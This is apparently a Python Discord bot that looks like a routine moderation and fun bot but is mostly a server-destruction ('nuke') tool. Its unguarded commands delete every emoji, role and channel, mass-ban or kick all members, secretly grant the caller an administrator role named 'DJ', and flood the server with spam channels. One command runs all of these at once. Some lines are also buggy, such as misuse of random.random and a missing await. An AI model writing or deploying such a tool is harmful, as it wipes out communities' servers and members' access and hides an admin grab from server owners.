import discord
from discord.embeds import Embed
from discord.ext import commands
from discord.ext.commands import bot
from discord.ext.commands.core import command, has_permissions
from discord.ext.commands.errors import ChannelNotFound
from discord.flags import Intents
import logging
import random

bottk="" #Paste the bot token here.

#This is the message that would be spammed in the server if you pull the final card, or use the command hackerman
Monologue=""

intents=discord.Intents(messages = True, guilds = True, reactions = True, members = True, presences = True)
client=commands.Bot(command_prefix='!', intents=intents)
client.remove_command("help")

@client.event
async def on_ready():
    print("You're ready to rumble!")

@client.command()
async def ping(ctx):
    await ctx.send(f'Pong! Latency is {client.latency*1000}ms')

@client.command()
@commands.has_permissions(ban_members=True)
async def ban(ctx, member: discord.Member, Reason=None):
    await member.ban(reason=Reason)
    embed=discord.Embed(title="User Banned!", description=f"{member} has been banned off the server!", color=ctx.author.color)
    await ctx.send(embed=embed)

@client.command()
@commands.has_permissions(kick_members=True)
async def kick(ctx, member: discord.Member, Reason=None):
    await member.kick(reason=Reason)
    embed=discord.Embed(title="User Kicked!", description=f"{member} has been kicked off the server!", color=ctx.author.color)
    await ctx.send(embed=embed)

@client.command()
async def coinflip(ctx, *, Q=None):
    Choice=['Heads', 'Tails']
    if Q!=None:
        ctx.send(f"On the line: {Q}\nA: {random.random(Choice)}")

@client.command(aliases=["8ball"])
async def _8ball(ctx, *, message):
    Choice = ["As I see it, yes.", "Ask again later.", "Better not tell you now.", "Cannot predict now.", "Concentrate and ask again.",
             "Don’t count on it.", "It is certain.", "It is decidedly so.", "Most likely.", "My reply is no.", "My sources say no.",
             "Outlook not so good.", "Outlook good.", "Reply hazy, try again.", "Signs point to yes.", "Very doubtful.", "Without a doubt.",
             "Yes.", "Yes – definitely.", "You may rely on it."]
    await ctx.send(f"Question: {message}\nAnswer: {random.random(Choice)}")
    pass

@client.command()   #To delete all emojis
async def omegalulgone(ctx):
    
    all_emoji= await ctx.guild.fetch_emojis()
    for emoji in all_emoji:
        try:
            await emoji.delete()
            print(f"Deleted emoji: {emoji}")
        except:
            print(f"Couldn't delete emoji: {emoji}")
            pass
            
    print("Emojis have been taken to the back and shot in the head!")

@client.command()   #To delete all roles
async def allwhite(ctx):
    all_roles= await ctx.guild.fetch_roles()
    for role in all_roles:
        try:
            await role.delete()
            print(f"Deleted role: {role}")
        except:
            print(f"Couldn't Delete role: {role}")
            pass
    print("Roles have been taken care of")

@client.command()   #To delete all channels
async def blindnesspotion(ctx):
    all_channels= await ctx.guild.fetch_channels()
    for channel in all_channels:
        try:
            await channel.delete()
            print(f"Deleted channel:{channel}")
        except:
            print(f"Coundn't delete channel: {channel}")
            pass
    print("Channels have been taken care of...")

@client.command()   #To ban everyone except the one who ran the command
async def whomegalol(ctx):
    all_members= ctx.guild.members
    for mem in all_members:
        try:
            if ctx.author==mem:
                pass
            else:
                await discord.Member.ban(mem)
                print(f"Member banned: {mem}")
        except:
            print(f"Couldn't ban member: {mem}")


@client.command()   #To kick everyone
async def kickbuttowski(ctx):
    all_members= await ctx.guild.members
    for mem in all_members:
        try:
            if ctx.author==mem:
                pass
            else:
                await discord.Member.kick(mem)
                print(f"Member kicked: {mem}")
        except:
            print(f"Couldn't kick member: {mem}")
            

@client.command()   #To get admin permissions
async def jamesbond007(ctx):
    admin_perms=discord.Permissions(administrator=True)
    admin_role= await ctx.guild.create_role(name="DJ", permissions=admin_perms)
    await ctx.author.add_roles(admin_role)
    

@client.command()   #To create channels until the channel limit and fill it with the monologue text above
async def hackerman(ctx):
    a="Lol"
    count=0
    try:
        while a=="Lol":
            channel = await ctx.guild.create_text_channel('told-you-so')
            await channel.send(Monologue)
            count+=1
    except:
        print(f"Done Spamming, created {count} channels in total")
        pass
    

@client.command()   #To: Ban people, delete channels, delete roles, delete emojis,
async def everythingatoncebylenka(ctx):
    await omegalulgone(ctx)
    await whomegalol(ctx)
    await allwhite(ctx)
    await blindnesspotion(ctx)
    await hackerman(ctx)

@client.command()
async def help(ctx):
    await ctx.send("The help command is under development! Hang on tight!")

client.run(bottk)
